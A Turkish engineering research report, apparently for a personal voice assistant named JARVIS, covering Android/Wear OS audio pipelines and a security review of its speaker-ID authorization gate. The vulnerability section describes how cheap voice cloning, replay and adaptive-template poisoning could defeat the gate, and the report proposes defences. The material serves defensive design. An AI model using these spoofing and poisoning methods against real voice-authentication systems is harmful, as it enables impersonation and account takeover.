- 🔴 **Android 17 background audio hardening** (Haz 2026, **tüm uygulamalar, target API'den bağımsız**): arka planda `AudioTrack.write()` sessizce susturuluyor, `requestAudioFocus()` başarısız dönüyor. Görünür activity veya **while-in-use yetkili** FGS gerekiyor. **JARVIS'in arka plandan TTS konuşması tam bu kısıta giriyor.** Test: `adb shell cmd audio set-enable-hardening throw`; teşhis: `adb dumpsys audio` → `AudioHardening`

Android 17 ayrıca `USAGE_ASSISTANT` için ayrı volume stream ve `MODE_ASSISTANT_CONVERSATION` getirdi — ⚠️ **ama bu modun AEC zincirini tetikleyip tetiklemediğine dair resmî açıklama bulunamadı. Körlemesine geçiş yapma.**

**Platform AEC yetmezse:** kalite sıralaması **WebRTC AEC3 > AECM > SpeexDSP**. AEC3 far-end referansını near-end ile karışmadan *önce* ister, 16 kHz'de 64 örneklik (4 ms) bloklarla çalışır, gecikmeyi cross-correlation ile **kendisi tahmin eder**, ve **double-talk anında — yani tam barge-in anında — filtre adaptasyonunu dondurur**. ARM'de 4 ms bütçesine rahat sığıyor. ⚠️ **Resmî Maven artifact'ı yok**; topluluk JNI sarmalayıcıları var. Yazılımsal AEC seçersen source'u `MIC` yap — **iki AEC birbirini bozar.**

🎯 **En güçlü kalıp: speaker-aware barge-in.** Genel VAD yerine **hedef konuşmacıya koşullu VAD** — **Personal VAD** (Google, Odyssey 2020, arXiv 1908.04284): hedef konuşmacı embedding'ine koşullanmış, frame başına üç sınıf üreten VAD — *non-speech / target speaker / non-target speaker*. Optimal kurulumda **sadece 130K parametre** ile ayrı eğitilmiş VAD+ASV kombinasyonunu yeniyor. Makalenin amacı: *"streaming on-device ASR girdisini kapılamak ve pil tüketimini azaltmak."*

> **Bu, üç problemimizi aynı anda çözer:** (1) asistanın kendi TTS'i "non-target" sınıflanır ve barge-in tetiklemez, (2) ortamdaki başka insanlar tetiklemez, (3) STT sadece Kadir konuşurken çalışır → pil + gecikme kazancı. **Ve zaten sahip olduğumuz speaker-ID varlığından kaldıraç yapar.**

**Son savunma hattı — metin tabanlı yankı eleme.** STT çıktısını asistanın az önce söylediği TTS metniyle karşılaştır, eşleşenleri at. Üretim eşiği: **%70+ kelime örtüşmesi**. ⚠️ **Sınırı dürüstçe:** transkript üretildikten *sonra* devreye girer — VAD'in yanlış tetiklenmesini, TTS'in gereksiz kesilmesini engellemez. **AEC'in yerine değil, üstüne.**

🎯 **Az bilinen API — mikrofon çakışmasını çözer:** `RecognizerIntent.EXTRA_AUDIO_SOURCE` bir `ParcelFileDescriptor` alır ve tanıyıcının kendi mikrofonunu açmasını engeller. Böylece **tek `AudioRecord`**'dan hem STT hem speaker-ID hem VAD beslenir — concurrent-capture kurallarına takılmazsın, üçü **birebir aynı AEC'lenmiş sinyali** görür. ⚠️ Google tanıyıcısının tr-TR'de bunu desteklediği **doğrulanmadı** — önce cihazda test et.

### 6.9 Wear OS ses tuzakları

**Platform:** Wear OS 7, **Android 17 (API 37) tabanlı**, ~%10 pil iyileşmesi. Play Store'a yükleme için A17 hedeflemek zorunlu.

**Mikrofon:** sürekli kayıt için `foregroundServiceType="microphone"` zorunlu ve servis **uygulama görünürken** başlatılmalı. 🔴 **Android 17 background audio hardening saatte de geçerli** → kol düşükken/ekran kapalıyken **TTS yanıtı sessizce susturulabilir.** Wear doze/battery-saver telefondan **çok daha agresif**.

**`SpeechRecognizer`:** çalışıyor. ⚠️ **Wear'a özgü sert kısıt: Voice Actions ve Assistant App Actions Wear OS'ta desteklenmiyor** (Çin hariç) — "Hey Google → uygulamam" sistem hook'u kuramazsın. Wear OS 7'de yerine **AppFunctions API** (Early Access). Wear'da tr-TR on-device desteği **resmî olarak doğrulanamadı** → `checkRecognitionSupport()` ile runtime kontrol şart.

🔴 **`TextToSpeech` — en somut Türkçe tuzağı:**
- Wear OS 4+ cihaz-üstü motoru **50+ dil destekliyor ama sadece 7 dil ön yüklü: İngilizce, İspanyolca, Fransızca, İtalyanca, Almanca, Japonca, Mandarin. TÜRKÇE ÖN YÜKLÜ DEĞİL**
- Ön yüklü değilse saat ses dosyasını **ilk Wi-Fi bağlantısında ve şarjdayken** otomatik indirir → **tr-TR ilk kullanımda hazır olmayabilir.** `setLanguage()` dönüş kodunu (`LANG_MISSING_DATA` / `LANG_NOT_SUPPORTED`) **mutlaka kontrol et**
- ⚠️ tr-TR'nin o 50+ dil listesinde olduğu **resmî olarak doğrulanamadı** → cihazda `getAvailableLanguages()` ile test et
- **Motor boot'tan sonra ~10 saniye açılıyor** → `synthesizeToFile()` ile pre-warm et
- Amaçlanan kullanım erişilebilirlik/uyarı okuma — **uzun metin için değil.** Uzun yanıtları saatte kısalt veya telefona yönlendir

**Bluetooth SCO:** `startBluetoothSco()`/`setSpeakerphoneOn()` **deprecated** → `setCommunicationDevice(AudioDeviceInfo)` (API 31+). `AudioDeviceCallback` ile rota değişimlerini izle. ⚠️ **Wear'a özgü resmî SCO rehberi bulunamadı**; saat↔kulaklık↔telefon üçgeninde kimin kazandığına dair **kesin resmî kural yok**.

🔴 **Pil — en sert kısıt.** Resmî tablo: **ağ erişimi (LTE/Wi-Fi) = Çok Yüksek**, ekran açık = Yüksek, yüksek CPU = Yüksek, BT = Orta. Data Layer için: *"her iletim cihazı uyandırır."*
Ölçüm (ikincil): sürekli playback+record ile **3 dakikada** Galaxy Watch 7 ~%1, Pixel Watch 3 ~%1.52 → **saatte ~%17–30, yani ~3–5 saat tavan.** Üçüncü parti Wear kayıt uygulamalarının tavsiyesi: **15 dakikadan uzun sürekli kayıt önerilmiyor.**

> 🎯 **Sonuç: saatte sürekli açık mikrofon uygulanabilir değil.** Push-to-talk (kol kaldırma / krona / tile dokunuşu ile kısa oturum) tek gerçekçi model. **Personal VAD burada da işe yarar** — akışı yalnızca hedef konuşmacı algılandığında aç.

**PCM akışı:** `ChannelClient` resmî olarak tam bu iş için tarif ediliyor (*"streaming data, e.g. microphone audio"*). Kaba bütçe: 16 kHz mono PCM16 = **256 kbps**. Opus'a düşürmek radyo uyanma süresini kısaltır — ⚠️ **ama lossy codec speaker-ID'yi bozar; bu bir ödünleşim.**

**Doğrudan ağ vs telefon köprüsü:** Resmî tavsiye *"Wear uygulamalarını ağla doğrudan iletişim kuracak şekilde geliştirin; Data Layer'ı ağla iletişimin birincil yolu olarak kullanmayın"* — **ama bu tavsiye "ağ erişimi = Çok Yüksek pil" uyarısıyla gerilim halinde.** Makul denge (dokümanda yazmıyor): **komut/kısa yanıt için doğrudan ağ**, **sürekli PCM için telefon köprüsü**. Ölçmeden kesinleştirme.

### 6.10 🔴 JARVIS'İN EN KRİTİK AÇIĞI

> **Anti-spoofing yok, ve ses kimliği yetki kapısı olarak kullanılıyor. Bu ikisi bir arada, sistemi TANIMLI OLARAK açık bırakıyor.**

**Kanıt zinciri, üç bağımsız kaynaktan:**

**1. Ölçülmüş açık.** SASV Challenge 2022 evaluation setinde çıplak ECAPA-TDNN'in **SPF-EER'i %30.75**. Gerçek insan impostorlara karşı %1.63 olan aynı sistem, sentetik/dönüştürülmüş seslere karşı çalışma noktasında yaklaşık **her üç saldırıdan birini kabul ediyor**. Eşiklerimiz (accept 0.35 / adapt 0.60) bu tabloyu değiştirmiyor — **o eşikler "başka bir insan mı" sorusuna göre ayarlı, ve SASV rakamı zaten eşikten bağımsız bir EER.**

**2. Sıfıra yakın saldırı maliyeti.** **Chatterbox Multilingual V3 — MIT lisanslı, Türkçe resmî destekli, 5 SANİYE referansla zero-shot klonlayan, ağırlıkları HuggingFace'te açık.** XTTS-v2 6 saniyeyle aynı işi yapıyor. Kadir'in 5 saniyelik sesi bir sesli mesajda, bir videoda, bir toplantı kaydında. **Centrelink'i aşan gazeteci 4 dakika kullanmıştı — 2026'da 5 saniye yetiyor.**

**3. Sektör bu kapıyı kapattı.** Google Voice Match ile cihaz kilidi açmayı kaldırdı. NIST SP 800-63B biyometriyi tek başına authenticator saymıyor. HSBC ve Centrelink aşıldı. Nuance Gatekeeper kapandı. Pindrop'un rakamları bile katmansız çözümün yetmediğini söylüyor.

**JARVIS'e özgü iki ikincil açık, ilkinden türüyor:**

🔴 **(a) Kişiselleştirilmiş TTS, sistemi kendi kendine spoof ettirebilir.**
Kadir asistanın sesini **kendi sesinden** klonlarsa (hafızadaki "asistan ses kişiselleştirme" hedefi bunu doğrudan ima ediyor), asistanın her çıktısı **kusursuz bir Kadir spoof'u** olur. Bugün bunu tutan tek şey yarım-düpleks yankı koruması — yani mimarinin **geçici** bir kısıtı. **Tam düplekse geçildiği an sistem kendi kendini doğrular.** Bu, mevcut "asistan kendi TTS'ini puanlıyordu" hatasının çok daha tehlikeli hali.

🔴 **(b) Adaptif galeri, geçici bir başarıyı KALICI ARKA KAPIYA çeviriyor.**
*Biometric Backdoors*: denetimsiz şablon güncelleme **10'dan az enjeksiyonla %70 başarı** oranıyla poisonlanabiliyor. CM olmadan, bir kez kabul edilen sentetik örnek galeriye yazılır ve orada kalır. Sonraki saldırılar kolaylaşır. **Sistem saldırganı öğrenir.**

🔴 **Replay'in ayrıca vurgulanması gerekiyor:** ev ortamında en olası saldırı klonlama değil, **kayıt-ve-çal**. ReplayDF bunun CM literatürünün kör noktası olduğunu gösteriyor (**%4.7 → %18.2**, RIR augmentation'la bile %11). **Yani CM eklemek bile replay'i tam kapatmıyor; challenge-response (rastgele rakam söylet, STT ile doğrula) buna karşı CM'den daha etkili ve çok daha ucuz.**

### 6.11 ÇALINACAK fikirler (efor tahminiyle, kişi-gün)

**S1 — Anti-spoofing kapısı + yetki katmanlaması — 6–10 gün** 🔴 *(bunu yapmazsan diğer dördü kozmetik)*
- **CM ekle:** `AntiDeepfake` **MMS-300M** veya **XLS-R-1B**, Cloud Run'da sunucu tarafı. Kod BSD-3, ağırlık CC-BY-NC-SA-4.0 — kişisel kullanım için sorun değil. Deepfake-Eval-2024 EER %11.85. Alternatif: `Nes2Net` (entegrasyonu en kolay; **lisansı doğrulanmalı**)
- **Kaskad kapı:** CM önce → bonafide değilse tur reddedilir **ve galeriye asla yazılmaz** → sonra ASV. Skorları LLR ölçeğine kalibre et, **a-DCF ile eşik seç**
- **Yetki katmanları:** **T0** ses gerekmez (bilgi sorgusu) · **T1** ASV yeterli (ışık, müzik, hatırlatma) · **T2** ASV + CM (kişisel veri okuma, mesaj taslağı) · **T3** ASV + CM + **cihaz faktörü** (`BiometricPrompt` / cihaz-bağlı anahtar) → para, kalıcı silme, dışa gönderim, **ve galeriye yeni enrollment**
- **Challenge-response (T3 için, +1 gün):** rastgele 4 haneli sayı söylet, STT ile doğrula. **Replay'e karşı CM'den etkili, maliyeti ~sıfır**

**S2 — Adaptif galeriyi sertleştir — 3–4 gün**
Güncelleme kapısını CM'in **arkasına** al · **yön tutarlılığı izleme** (2 enjeksiyon sonrası %99+ tespit) · **marj kuralı** (eşiği az farkla geçen yazılmasın) · **drift bütçesi** + append-only versiyonlu galeri + "N gün öncesine dön" · **kanal başına alt-galeri**

**S3 — Kalibrasyon hattını gerçek yap + embedding'i yükselt — 4–6 gün**
- **Cohort kur:** VoxCeleb/Common Voice tr'den N konuşmacı → impostor dağılımı; Kadir'in farklı oturumları → hedef dağılım. **DET eğrisi çiz, eşiği hedef FAR'a göre seç.** Bu olmadan 0.72/0.16 bir tahmindir
- **AS-Norm** + **QMF kalibrasyonu** (süre, SNR, magnitude). IDLAB: ortalama %6 EER / %2 minDCF kazanç. **Kısa komutlar için bu, model değiştirmekten daha çok kazandırır**
- **ReDimNet2-B2/B3'e geç** (MIT, `torch.hub`): dörtte bir parametreyle %0.57/%0.42. Eşikler nasılsa yeniden türetilecek — **birlikte yap**
- ❌ **Türkçe fine-tune'u yapma** (SIU 2024: ön-eğitimli İngilizce model EER'de daha iyi; Common Voice tr'de sadece 1.829 konuşmacı)

**S4 — Tam düpleks + akıllı tur yönetimi — 5–8 gün** *(⚠️ `VOICE_COMMUNICATION` kısmı ZATEN YAPILMIŞ — bkz. [§8.4](#84-q4--android-ses-hatti-aec); kalan iş `setMode` + self-test + Personal VAD + Smart Turn)*
~~`VOICE_COMMUNICATION`'a geç~~ ✅ · **`AudioManager.setMode(MODE_IN_COMMUNICATION)` ekle** (eksik halka) · **AEC self-test telemetrisi** (`getEffects()`, `isAvailable()`'a güvenme) · **6 saniye reset tuzağını** sessiz track ile kapat · **tek `AudioRecord` + `EXTRA_AUDIO_SOURCE`** ile STT'yi aynı AEC'lenmiş akıştan besle · **barge-in kararını Personal VAD'a bağla** (130K param, zaten sahip olduğumuz speaker-ID'den kaldıraç) · **Smart Turn v3** (8M, 12 ms CPU, BSD-2, Türkçe) ile semantik tur sonu · **%70 kelime örtüşmesiyle metin yankı elemesi** (son hat) · **eşikleri AEC'li sinyalde yeniden kalibre et** · **Android 17 hardening'i şimdiden çöz** (WIU yetkili `microphone` FGS; hem telefonu hem Wear OS 7'yi vuruyor)

**S5 — Asistan sesini filigranla + klonlama politikası — 1–2 gün** ⭐ *(en ucuz, en yüksek getirili madde)*
- **`resemble-ai/Perth` (PerTh) MIT lisanslı bağımsız bir Python paketi.** Asistanın ürettiği her TTS çıktısını filigranla; speaker-ID hattına **"filigran tespit edilirse turu reddet ve galeriye yazma"** kuralını koy. MP3 sıkıştırma, yeniden kodlama, zaman kaydırma ve düzenlemeden sağ çıkıyor, tespit doğruluğu ~%100
- **Bu, kritik açığın (a) maddesini MİMARİ OLARAK kapatır ve tam düplekse geçmeyi güvenli kılar.** Ayrıca asistanın kaydedilip sonra çalınmasını da yakalar
- 🎯 **Chatterbox zaten her çıktıya PerTh gömüyor** — Chatterbox seçersen filigran bedava, sadece *tespit* tarafını yazman gerekiyor
- **Politika kararı:** asistanın sesi Kadir'in sesinden klonlanacaksa filigran **zorunlu**
- **Ek kazanç:** GSM köprüsü için ses klonlama yatırımı yapma — 8 kHz dar bant klonlanmış sesin karakterinin çoğunu yok eder. **Klonlamayı telefon uygulaması kanalına sakla**

### 6.12 Doğrulama notu

**Birincil kaynaktan doğrulandı:** ASVspoof 5 (arXiv 2601.03944) · SASV2022 baseline rakamları · ReplayDF %4.7→%18.2 (arXiv 2505.14862) · Deepfake-Eval-2024 −%48 (arXiv 2503.02857) · AntiDeepfake varyantları + lisansları + EER'leri · AASIST MIT + 85.306 param · SSL_Anti-spoofing MIT · ReDimNet2 MIT + tam tablo · Biometric Backdoors savunması · NIST SP 800-63B · Piper tr_TR model kartı · Chatterbox MIT + Türkçe · PerTh MIT · Wyoming spec · LiveKit turn detector Türkçe skorları · Smart Turn v3 · **Android CDD 5.4 `VOICE_RECOGNITION` preprocessing yasağı** · AOSP `VOICE_COMMUNICATION` AEC zorunluluğu · **Wear OS TTS 7 ön yüklü dil (Türkçe yok)** · Wear OS pil tablosu · Nemotron 3.5 FLEURS Türkçe WER.

**İkincil/doğrulanamadı:** ASVspoof 5 en iyi/baseline tablosunda **çelişki var** (T45 min a-DCF 0.28 vs "SASV multi-branch ~0.07") · MDPI Türkçe Whisper WER aralığı · **Android 11+ 6 saniye `MODE_IN_COMMUNICATION` reset davranışı** · whisper.cpp Android/Pi RTF ölçümleri · Wear OS pil ekstrapolasyonu.

**Bulunamadı (uydurulmadı):** SIU 2024 makalesinin **sayısal EER/min-DCF değerleri** (IEEE/ResearchGate 403) · **SpeechBrain'de anti-spoofing recipe'i yok** (doğrulanmış yokluk) · Türkçeye özel açık ses deepfake veri seti · XLS-R-300M sınıfı CM'in CPU'da gerçek çıkarım süresi · Nes2Net lisansı · 8 kHz'in Türkçe WER'e ölçülmüş etkisi · **Wear OS'ta `AcousticEchoCanceler` desteğine dair herhangi bir resmî belge** · Wear'da tr-TR TTS/on-device STT resmî teyidi · Android 17 `MODE_ASSISTANT_CONVERSATION`'ın AEC'i tetikleyip tetiklemediği · WebRTC AEC3 için resmî Maven artifact'ı · Chatterbox/F5-TTS-Turkish Türkçe MOS sayıları.

⚠️ **Metodolojik uyarı:** Rapordaki HuggingFace fine-tune WER'lerinin tamamı *self-reported* ve **farklı test setlerinde** — birbirleriyle karşılaştırılamazlar. Pindrop ve Resemble rakamları da satıcının kendi ölçümü.

### 6.13 Kaynaklar

**Anti-spoofing:** [ASVspoof 5 (arXiv 2601.03944)](https://arxiv.org/abs/2601.03944) · [Deepfake-Eval-2024 (arXiv 2503.02857)](https://arxiv.org/abs/2503.02857) · [ReplayDF (arXiv 2505.14862)](https://arxiv.org/abs/2505.14862) · [clovaai/aasist](https://github.com/clovaai/aasist) · [TakHemlata/SSL_Anti-spoofing](https://github.com/TakHemlata/SSL_Anti-spoofing) · [nii-yamagishilab/AntiDeepfake](https://github.com/nii-yamagishilab/AntiDeepfake) · [Liu-Tianchi/Nes2Net](https://github.com/Liu-Tianchi/Nes2Net)
**SASV/metrik:** [SASV 2022 baselines (arXiv 2204.09976)](https://arxiv.org/pdf/2204.09976) · [Multi-Stage Score Fusion (arXiv 2509.12668)](https://arxiv.org/abs/2509.12668) · [a-DCF (arXiv 2403.01355)](https://arxiv.org/pdf/2403.01355) · [Three-class + LLR (arXiv 2603.13780)](https://arxiv.org/abs/2603.13780)
**Konuşmacı doğrulama:** [SIU 2024 Turkish ECAPA fine-tune (IEEE 10710963)](https://ieeexplore.ieee.org/document/10710963/) · [PalabraAI/redimnet2](https://github.com/PalabraAI/redimnet2) · [IDLAB VoxSRC-20 QMF (arXiv 2010.11255)](https://arxiv.org/pdf/2010.11255) · [Speech Bandwidth Expansion for Telephony ASV (Odyssey 2020)](https://www.isca-archive.org/odyssey_2020/sivaraman20_odyssey.pdf)
**Poisoning:** [Biometric Backdoors (arXiv 1905.09162)](https://arxiv.org/pdf/1905.09162) · [Poisoning Adaptive Biometric Systems (SSPR 2012)](https://link.springer.com/content/pdf/10.1007/978-3-642-34166-3_46.pdf)
**Endüstri:** [NIST SP 800-63B](https://pages.nist.gov/800-63-4/sp800-63b.html) · [Google Voice Match](https://support.google.com/assistant/answer/7394306) · [Incident 428: HSBC Voice ID](https://incidentdatabase.ai/cite/428/) · [Incident 523: Centrelink](https://incidentdatabase.ai/cite/523/) · [ChaRVoC (arXiv 2605.02990)](https://arxiv.org/html/2605.02990v1)
**Ses hattı:** [LiveKit turn detector](https://docs.livekit.io/agents/build/turns/turn-detector/) · [pipecat-ai/smart-turn](https://github.com/pipecat-ai/smart-turn) · [OHF-Voice/wyoming](https://github.com/OHF-Voice/wyoming) · [openWakeWord hey_jarvis](https://github.com/dscripka/openWakeWord/blob/main/docs/models/hey_jarvis.md) · [Asterisk AudioSocket](https://docs.asterisk.org/Configuration/Channel-Drivers/AudioSocket/) · [asterisk-chan-quectel](https://github.com/IchthysMaranatha/asterisk-chan-quectel/blob/master/README.md) · [Rhasspy'nin sonu](https://community.rhasspy.org/t/2026-the-real-future-of-rhasspy-the-end/5872)
**Türkçe STT/TTS:** [nemotron-3.5-asr-streaming-0.6b](https://huggingface.co/nvidia/nemotron-3.5-asr-streaming-0.6b) · [ysdede/turkish_asr_leaderboard](https://huggingface.co/spaces/ysdede/turkish_asr_leaderboard) · [resemble-ai/chatterbox](https://github.com/resemble-ai/chatterbox) · [resemble-ai/Perth](https://github.com/resemble-ai/Perth) · [Karayakar/F5-TTS-Turkish](https://huggingface.co/Karayakar/F5-TTS-Turkish) · [piper-voices tr_TR/dfki](https://huggingface.co/rhasspy/piper-voices/blob/main/tr/tr_TR/dfki/medium/MODEL_CARD)
**Android/Wear:** [AOSP preprocessing effects](https://source.android.com/docs/core/audio/implement-pre-processing) · [CDD 5.4 Audio Recording](https://android.googlesource.com/platform/compatibility/cdd/+/refs/tags/platform-tools-31.0.0/5_multimedia/5_4_audio-recording.md) · [Android 17 background audio hardening](https://developer.android.com/about/versions/17/changes/bg-audio) · [Personal VAD (arXiv 1908.04284)](https://arxiv.org/abs/1908.04284) · [WebRTC AEC3 nasıl çalışır](https://switchboard.audio/hub/how-webrtc-aec3-works/) · [Wear OS: Voice input](https://developer.android.com/training/wearables/user-input/voice) · [Wear OS pil](https://developer.android.com/training/wearables/apps/power) · [Wear OS TTS motoru duyurusu](https://android-developers.googleblog.com/2024/03/introducing-new-text-to-speech-engine-wear-os.html)

---

## 7. Sentez

### 7.1 JARVIS'in gerçek konumu — üç cümle

1. **Mimari tezimiz doğru ve yalnız.** Bulut-yerli + scale-to-zero + ince istemci kombinasyonunu **kimse yapmıyor**; kategorinin tamamı yerel-öncelikli, bulut kullananlar bile always-on. Hermes bu tezi bağımsız olarak doğruluyor ama tam uygulayamıyor (connection-driven olduğu için gateway'i always-on kalmak zorunda).
2. **Ayırt edici özelliklerimizden ikisi eridi, ikisi sağlam.** *Kendi mobil istemcisi* artık ayırt edici değil (OpenClaw Android + Wear OS'ta önümüzde ve Play Store'da). *Onay katmanı* artık standart. Ama **scale-to-zero bulut beyin** ve **sesli biyometrik yetki kapısı** hâlâ tamamen bize ait — ve ikisinin **birleşimi** ("kim istedi" ile "ne yapılabilir"in aynı sistemde buluşması) hiç kimsede yok.
3. **En güçlü saydığımız özellik, aynı zamanda en büyük açığımız.** Ses kimliği yetki kapısı olarak kullanılıyor ama **anti-spoofing yok** — ve 5 saniyelik bir ses örneğiyle MIT lisanslı, Türkçe destekli bir modelden klon üretilebiliyor.

### 7.2 Öncelik sırası — kanıta dayalı

| # | İş | Neden şimdi | Efor | Bölüm |
|---|---|---|---|---|
| **1** | 🔴 **Anti-spoofing kapısı + yetki katmanlaması (T0–T3)** | ECAPA'nın sentetik sese karşı SPF-EER'i **%30.75**. Klonlama maliyeti **5 saniye**. Sektör bu kapıyı kapattı | 6–10 g | [§6.11 S1](#611-çalinacak-fikirler-efor-tahminiyle-kişi-gün) |
| **2** | ⭐ **Asistan TTS'ini PerTh ile filigranla** | En ucuz/en yüksek getiri. Asistanın sesi Kadir'den klonlanırsa sistem kendi kendini doğrular. **Tam düplekse geçmenin ön koşulu** | 1–2 g | [§6.11 S5](#611-çalinacak-fikirler-efor-tahminiyle-kişi-gün) |
| **3** | 🔴 **Adaptif galeriyi sertleştir** (CM arkasına al, yön tutarlılığı, drift bütçesi, geri alınabilirlik, kanal başına galeri) — *marj kuralı [§8.3](#83-q3--speaker-id-eşikleri-ve-kalibrasyon)'e göre ZATEN VAR* | Poisoning **10'dan az enjeksiyonla %70 başarı**. Geçici bir başarıyı kalıcı arka kapıya çeviriyor | ~~3–4~~ **2–3 g** | [§6.11 S2](#611-çalinacak-fikirler-efor-tahminiyle-kişi-gün) |
| **4** | **Oturum düzeyinde taint bayrağı** | YEŞİL-tool-kötü-argüman kaçağı açık. **Tek boolean, sınıf düzeyinde prompt injection kapsaması** | 1–2 g | [§5.9 P4](#59-çalinacak-fikirler-1) |
| **5** | **Hafıza regresyon seti (Türkçe, 40–60 soru)** | Arşivci'nin bilgi yok etmesini **hiçbir şey yakalamıyor**. Aşağıdaki hafıza işlerinin hiçbiri bu olmadan kanıtlanamaz | 1 g | [§4.8 M0](#48-çalinacak-fikirler) |
| **6** | **Mem0'ın yazma kapısı (ADD/UPDATE/DELETE/NONE)** | `remember_fact` doğrudan yazıyor → çelişen olgular yan yana yaşayacak. **Birkaç ay içinde kesin bozulma** | 1–2 g | [§4.8 M1](#48-çalinacak-fikirler) |
| **7** | **Kalibrasyon hattı (cohort + AS-Norm + QMF + DET)** | 0.72/0.16 şu an **bir tahmin**. Kısa komutlarda EER 2–3 kat yüksek | 4–6 g | [§6.11 S3](#611-çalinacak-fikirler-efor-tahminiyle-kişi-gün) |
| **8** | **ACE Curator: ders defterini playbook'a çevir** | "Aynı hatayı iki kez yapma" ilkesini **ilk kez gerçekten uygulanabilir** kılar. Delta-update, context collapse'i engeller | 2–3 g | [§4.8 M3](#48-çalinacak-fikirler) |
| **9** | **Write-origin provenance + yaşam döngüsü küratörü** | **K3'ün ön koşulu.** Daha fazla ön-onay değil, geri alınabilir çöp toplama | 2–3 g | [§2.8 H2](#28-çalinacak-fikirler) |
| **10** | **Kalıcı, operanda-bağlı onay + tipli ret** | "WhatsApp mesajı gönder" onayının "herhangi bir kişiye herhangi bir mesaj" olmasını önler | 2–3 g | [§1.10 Ç1](#110-çalinacak-fikirler) + [§5.9 P2](#59-çalinacak-fikirler-1) |
| **11** | **`jarvis guvenlik-denetimi` komutu** | Postür drift'ini yakalar; "K2 canlı+kanıtlı" disiplininin güvenlik ayağı | 2–3 g | [§1.10 Ç3](#110-çalinacak-fikirler) |
| **12** | **`setMode(MODE_IN_COMMUNICATION)` + AEC self-test + Personal VAD + Smart Turn v3** — *`VOICE_COMMUNICATION`'a geçiş [§8.4](#84-q4--android-ses-hatti-aec)'e göre ZATEN YAPILMIŞ* | AEC yolu kurulu ama **`setMode` eksik** → çalışıp çalışmadığı cihaza bağlı bir şans meselesi, ve ölçemiyoruz. **Tam düplekse 1 ve 2'den SONRA geçilir** | ~~5–8~~ **4–6 g** | [§6.11 S4](#611-çalinacak-fikirler-efor-tahminiyle-kişi-gün) |

> **Sıralama mantığı:** 1–3 güvenlik açığı kapatıyor (biri aktif olarak sömürülebilir). 4–5 **ölçüm altyapısı** — onlar olmadan sonraki işlerin işe yarayıp yaramadığı kanıtlanamaz. 6–10 mimari borç. 11–12 kalite.
> **12 (tam düpleks) bilinçli olarak 1 ve 2'den sonra:** bugün yarım-düpleks, klonlanmış-asistan-sesi açığını **tesadüfen** kapatıyor. Filigran olmadan tam düplekse geçmek açığı aktive eder.

### 7.3 Yeniden yazmayacaklarımız (karar kaydı)

| Yazmayacağız | Kullanacağız | Bölüm |
|---|---|---|
| Olgu konsolidasyonu pipeline'ı | **Vertex AI Memory Bank** (`enable_consolidation` + memory revisions) veya Mem0 prompt'u (Apache-2.0) | [§4.9](#49-yeniden-yazmayin--yazin) |
| Hafıza benchmark'ı | **LongMemEval / LoCoMo** alt kümesini çevir | [§4.9](#49-yeniden-yazmayin--yazin) |
| Audit log şeması | **OCSF 6003 + OWASP AOS** alan adları | [§5.10 D](#510-yeniden-yazmayin) |
| Prompt injection savunma deseni | **Design Patterns (arXiv 2506.08837)** altı deseninden birini bilinçli seç ve **yaz** | [§5.10 F](#510-yeniden-yazmayin) |
| Anti-spoofing modeli | **AntiDeepfake** (NII Yamagishi) veya Nes2Net | [§6.1](#61-anti-spoofing-2026-durumu) |
| Ses filigranı | **`resemble-ai/Perth`** (MIT) | [§6.11 S5](#611-çalinacak-fikirler-efor-tahminiyle-kişi-gün) |
| Semantik tur sonu tespiti | **Smart Turn v3** (BSD-2, Türkçe, 12 ms CPU) | [§6.6](#66-ses-hatti-altyapisi) |
| Ev içi STT/TTS servis protokolü | **Wyoming** (MIT) — *ama Pi↔Cloud Run arasında DEĞİL (auth/TLS yok)* | [§6.6](#66-ses-hatti-altyapisi) |
| Telefon hattı ses köprüsü | **Asterisk + AudioSocket** + `asterisk-chan-quectel`; **önce SIP trunk alternatifini değerlendir** | [§6.6](#66-ses-hatti-altyapisi) |

| Yazacağız (hazırı uymuyor) | Neden |
|---|---|
| Hafıza store'unun kendisi | İncelenen 6 framework'ün **hiçbirinde Firestore adaptörü yok** |
| Politika enforcement kodu | Rego tek kullanıcılık sisteme orantısız. **Kuralları YAML'a taşı + test yaz** — %80 faydayı %5 maliyetle |
| Onay taşıma katmanı (kuyruk + FCM + Android kartı) | Rakiplerde yok, bizde doğru. **Ama ADK'nın native `require_confirmation`'ını ölç** (⚠️ `@experimental` + `DatabaseSessionService`/`VertexAiSessionService` desteklenmiyor) |

### 7.4 Doğrulanması gereken açık sorular

> ✅ **1–4 numaralı sorular 5 Ağustos 2026'da kod üzerinden cevaplandı — [§8](#8-kod-doğrulamasi-5-ağustos-2026)'e bakın. İkisinin cevabı bu raporun iddialarını DÜZELTTİ.** 5–7 hâlâ açık: 5 bir tasarım kararı (Kadir'in), 6 ve 7 ölçüm gerektiriyor.

Bu bölümdeki öneriler başlangıçta **JARVIS'in kod tabanına bakılmadan** yazılmıştı:

1. **Hangi ADK session service kullanılıyor?** `DatabaseSessionService` veya `VertexAiSessionService` ise ADK'nın native tool confirmation'ı **bugün kullanılamaz** ([§5.10 C](#510-yeniden-yazmayin)).
2. **Y3'te ret gerekçesi zorunlu mu?** Değilse [§5.9 P2](#59-çalinacak-fikirler-1) doğrudan uygulanabilir.
3. **0.72/0.16 hangi normalizasyondan sonra ölçüldü?** AS-Norm yoksa bu sayılar kalibre edilmemiş demektir ([§6.4](#64-adaptif-galeri-güvenliği)).
4. **Speaker-ID hattı ham PCM mi görüyor?** `VOICE_COMMUNICATION`'a geçilirse AEC+NS+AGC uygulanır → **eşikler geçersizleşir**.
5. **Asistan sesi Kadir'in sesinden mi klonlanacak?** Evetse filigran **zorunlu** ([§6.10a](#610-jarvisin-en-kritik-açigi)).
6. **XLS-R sınıfı bir CM Cloud Run CPU'sunda ne kadar sürüyor?** Ölçülmedi; maliyet ve gecikme bütçesi buna bağlı.
7. **Wear OS'ta tr-TR TTS gerçekten var mı?** `getAvailableLanguages()` ile cihazda test edilmeli — **Türkçe ön yüklü değil** ([§6.9](#69-wear-os-ses-tuzaklari)).

### 7.5 Bu rapor nasıl güncellenir

Bu belge **5 Ağustos 2026'nın fotoğrafıdır.** Hızlı hareket eden bir alan; özellikle şunlar bayatlar:
- Yıldız/issue sayıları ve proje sağlığı sinyalleri (§1.8, §2.6, §3.1)
- Model tabloları (§4.7 embedding, §6.3 ASV, §6.7 STT/TTS)
- OpenClaw ve Hermes'in güvenlik duruşu — **ikisi de aktif olarak değişiyor**
- ADK'nın `@experimental` özellikleri (§5.10 C)

Sabit kalması beklenenler: mimari tezler, güvenlik olaylarının kök nedenleri (§1.7), akademik desenler (ACE, CaMeL, Personal VAD, Biometric Backdoors), NIST/OWASP standartları.

